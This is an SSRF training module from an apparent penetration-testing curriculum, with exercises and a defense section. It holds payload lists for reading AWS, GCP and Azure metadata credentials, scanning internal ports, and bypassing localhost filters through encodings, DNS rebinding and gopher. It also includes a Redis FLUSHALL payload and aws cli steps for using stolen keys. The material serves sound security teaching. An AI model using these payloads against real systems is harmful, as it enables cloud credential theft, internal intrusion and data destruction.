# Server-Side Request Forgery (SSRF)

## 1. Orientation

### What this module covers
This module covers Server-Side Request Forgery (SSRF)—tricking a server into making requests on your behalf to internal or external resources. SSRF is particularly dangerous in cloud environments.

### Fit in the Learning Path
SSRF is the gateway to cloud compromise. It allows access to internal services, cloud metadata APIs, and turns the vulnerable server into an attack proxy. This is a critical vulnerability class in modern architectures.

### Learning Objectives
By the end of this module, you will:
*   Identify SSRF vulnerable endpoints
*   Exploit cloud metadata services
*   Bypass SSRF protections
*   Understand internal network pivoting via SSRF

---

## 2. Core Content

### Mental Model: The Inside Agent

**How professionals think about this:**
SSRF turns the target server into your agent inside the network. It can reach internal services, cloud metadata, and resources you can't access directly. You're essentially using the server as a proxy into protected networks.

```
SSRF CONCEPT:

NORMAL REQUEST (blocked):
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│  ATTACKER ───────X───────► Internal Service (10.0.0.50)            │
│           Firewall blocks                                          │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘

SSRF ATTACK (bypassed):
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│  ATTACKER ────► WEB SERVER ────► Internal Service (10.0.0.50)      │
│             "Fetch this URL"   Server has access                   │
│                                                                     │
│  Attacker: ?url=http://10.0.0.50/admin                             │
│  Server:   Fetches it and returns response                        │
│  Result:   Attacker accesses internal admin panel                  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### SSRF Attack Vectors

**Common vulnerable features:**

```
VULNERABLE FUNCTIONALITY:

1. URL FETCH FEATURES
   ─────────────────────────────
   Profile image: "Import from URL"
   Document converter: "Fetch document from URL"
   Webhook configuration
   RSS feed reader
   URL preview (link unfurling)
   
   Parameters:
   ?url=
   ?uri=
   ?path=
   ?src=
   ?dest=
   ?redirect=
   ?proxy=
   ?feed=
   ?callback=

2. HIDDEN SSRF
   ─────────────────────────────
   PDF generators: HTML with <img> or <iframe>
   Image processors: SVG with external references
   XXE: External entity fetches URL
   Referer header processing
   Host header injection

3. PARTIAL SSRF
   ─────────────────────────────
   Only path controlled:
   ?file=/etc/passwd  (LFI that becomes SSRF)
   
   Only host controlled (rare):
   https://[ATTACKER].trusted.com/api
```

### Cloud Metadata Attacks

**The crown jewel of SSRF:**

```
CLOUD METADATA SERVICES:

AWS:
─────────────────────────────
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]
→ Returns: AccessKeyId, SecretAccessKey, Token

GCP:
─────────────────────────────
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
Headers required: Metadata-Flavor: Google
→ Returns: Service account tokens

AZURE:
─────────────────────────────
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Headers required: Metadata: true
→ Returns: Subscription, resource group, managed identity tokens

DIGITAL OCEAN / Others:
─────────────────────────────
http://169.254.169.254/metadata/v1/

ATTACK CHAIN:
─────────────────────────────
1. Find SSRF vulnerability
2. Request metadata URL
3. Get temporary credentials
4. Assume that IAM role
5. Pivot to other cloud resources
```

**AWS metadata extraction example:**

```
COMPLETE AWS METADATA ATTACK:

STEP 1: GET INSTANCE INFO
http://169.254.169.254/latest/meta-data/

STEP 2: GET IAM ROLE NAME
http://169.254.169.254/latest/meta-data/iam/security-credentials/
Response: MyEC2Role

STEP 3: GET CREDENTIALS
http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role
Response:
{
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "wJalr...",
  "Token" : "AQoEXAMPLE..."
}

STEP 4: USE CREDENTIALS
aws configure set aws_access_key_id ASIA...
aws configure set aws_secret_access_key wJalr...
aws configure set aws_session_token AQoEXAMPLE...

STEP 5: ENUMERATE
aws s3 ls
aws ec2 describe-instances
aws iam list-roles
```

### Internal Network Scanning

**Using SSRF as a scanner:**

```
INTERNAL SCANNING VIA SSRF:

PORT SCANNING:
─────────────────────────────
?url=http://127.0.0.1:22    → SSH banner
?url=http://127.0.0.1:3306  → MySQL banner
?url=http://127.0.0.1:6379  → Redis (often no auth)

Different responses indicate port state:
- Connection refused = Port closed
- Timeout = Filtered/no host
- Response/banner = Port open

SERVICE DISCOVERY:
─────────────────────────────
?url=http://10.0.0.1/
?url=http://10.0.0.2/
...
?url=http://10.0.0.254/

?url=http://internal.corp.local/
?url=http://admin.internal/
?url=http://jenkins.internal:8080/

COMMON INTERNAL TARGETS:
─────────────────────────────
127.0.0.1     Localhost services
10.0.0.0/8    Internal network
172.16.0.0/12 Internal network
192.168.0.0/16 Internal network
kubernetes.default Kubernetes API
consul:8500   Consul API
redis:6379    Redis (no auth?)
elasticsearch:9200 Elasticsearch
mongodb:27017 MongoDB
```

### SSRF Bypass Techniques

**Evading filters:**

```
SSRF BYPASS TECHNIQUES:

1. LOCALHOST ALTERNATIVES
   ─────────────────────────────
   127.0.0.1 (blocked, try alternatives)
   127.0.0.2 - 127.255.255.254 (also localhost)
   0.0.0.0
   localhost
   127.1
   127.0.1
   2130706433 (decimal)
   0x7f000001 (hex)
   0177.0.0.1 (octal)
   [::1] (IPv6)
   [::ffff:127.0.0.1] (IPv6 mapped)
   http://①②⑦.⓪.⓪.①/

2. DNS REBINDING
   ─────────────────────────────
   First lookup: evil.com → valid IP (passes check)
   Second lookup (server fetch): evil.com → 127.0.0.1
   
   Tools: rebinder, singularity

3. URL PARSING CONFUSION
   ─────────────────────────────
   http://evil.com@127.0.0.1/
   http://127.0.0.1#@evil.com/
   http://evil.com\.127.0.0.1/
   http://127.0.0.1.evil.com/

4. REDIRECT BYPASS
   ─────────────────────────────
   Application checks initial URL, follows redirect
   ?url=http://evil.com/redirect → 127.0.0.1

5. PROTOCOL BYPASS
   ─────────────────────────────
   http blocked? Try:
   file:///etc/passwd
   gopher://127.0.0.1:6379/
   dict://127.0.0.1:11211/
   
   Gopher is powerful: arbitrary TCP data

6. URL ENCODING
   ─────────────────────────────
   http://127.0.0.1/ → http://%31%32%37%2e%30%2e%30%2e%31/
   Double encode: %2531%2532%2537...
```

### Blind SSRF

**When you don't see the response:**

```
BLIND SSRF DETECTION:

OUT-OF-BAND DETECTION:
─────────────────────────────
Use Burp Collaborator or interactsh
?url=http://id.burpcollaborator.net/

If DNS query or HTTP hit received → SSRF confirmed

TIME-BASED DETECTION:
─────────────────────────────
?url=http://10.0.0.1/ → Response in 50ms (exists)
?url=http://10.0.0.99/ → Response in 10s (timeout, doesn't exist)

Different timing reveals internal network info

BLIND SSRF EXPLOITATION:
─────────────────────────────
1. Port scan internal network via timing
2. Trigger actions on internal services
   Redis: gopher://127.0.0.1:6379/FLUSHALL
3. Trigger outbound requests (exfiltration)
4. DOS internal services
```

### Defense Strategies

**Preventing SSRF:**

```
SSRF DEFENSES:

1. ALLOWLIST APPROACH
   ─────────────────────────────
   Only allow specific domains/IPs
   Deny everything else
   Most secure but least flexible

2. DENYLIST (LESS SECURE)
   ─────────────────────────────
   Block internal IPs: 127.*, 10.*, 192.168.*, 169.254.*
   Block file://, gopher://, dict://
   Monitor redirect chains
   
   Problem: Easy to bypass (see techniques)

3. NETWORK LEVEL
   ─────────────────────────────
   EC2: IMDSv2 (requires token)
   Firewall rules preventing metadata access
   Separate network for URL fetching services

4. APPLICATION LEVEL
   ─────────────────────────────
   Validate URL before AND after redirect
   Resolve DNS to IP and check
   Set strict timeouts
   Disable unnecessary protocols
   No user input for URLs when possible

5. AWS IMDSV2
   ─────────────────────────────
   Requires PUT request to get token
   Token must be included in header
   Significantly harder to exploit via SSRF
   
   aws ec2 modify-instance-metadata-options \
       --instance-id i-xxx \
       --http-tokens required
```

---

## 3. Guided Practice

### Exercise 1: SSRF Identification

For each feature, assess SSRF risk:

| Feature | SSRF Risk | Why |
|---------|-----------|-----|
| Profile image URL | ___ | ___ |
| Export to PDF | ___ | ___ |
| Webhook config | ___ | ___ |
| Password reset | ___ | ___ |

### Exercise 2: Bypass Testing

If `127.0.0.1` is blocked, which bypasses to try:

1. ___
2. ___
3. ___
4. ___

### Exercise 3: Metadata Attack Plan

SSRF found on AWS EC2. Your attack sequence:

1. First URL to try: ___
2. Get role name from: ___
3. Get credentials from: ___
4. First aws cli command: ___

---

## 4. Reflection Check

### Attack Understanding
1. SSRF only returns status code, not body. Still useful?

2. Application only allows HTTPS. Can you still attack metadata service?

3. DNS resolution check happens before fetch. Can you bypass?

### Defense Thinking
1. Why is allowlist better than denylist for SSRF?

2. IMDSv2 is enabled. Is SSRF risk eliminated?

3. Application needs URL fetch feature. Secure architecture?

---

## 5. Key Misconceptions

**MYTH: "We block localhost, so we're safe"**
REALITY: Dozens of localhost alternatives exist (decimal, hex, IPv6, DNS tricks).

**MYTH: "SSRF only matters if response is shown"**
REALITY: Blind SSRF can still scan, trigger actions, and exfiltrate via out-of-band.

**MYTH: "Internal services don't need authentication"**
REALITY: SSRF proves internal access ≠ trusted. All services need auth.

**MYTH: "URL validation prevents SSRF"**
REALITY: Validation must happen after redirect resolution. DNS rebinding bypasses pre-fetch checks.

**MYTH: "SSRF is just information disclosure"**
REALITY: SSRF can lead to RCE (Redis, other services) and full cloud account takeover.

---

## 6. Completion Criteria

This module is complete when you can:

1. **Identify** SSRF vulnerable functionality
2. **Exploit** cloud metadata services
3. **Bypass** common SSRF protections
4. **Scan** internal networks via SSRF
5. **Implement** proper SSRF defenses

---

## 7. Further Depth (Optional)

*   **Practice:** PortSwigger SSRF labs
*   **Tool:** Gopherus for gopher payload generation
*   **Research:** AWS IMDSv2 bypass techniques
*   **Lab:** Set up vulnerable app and practice metadata attacks
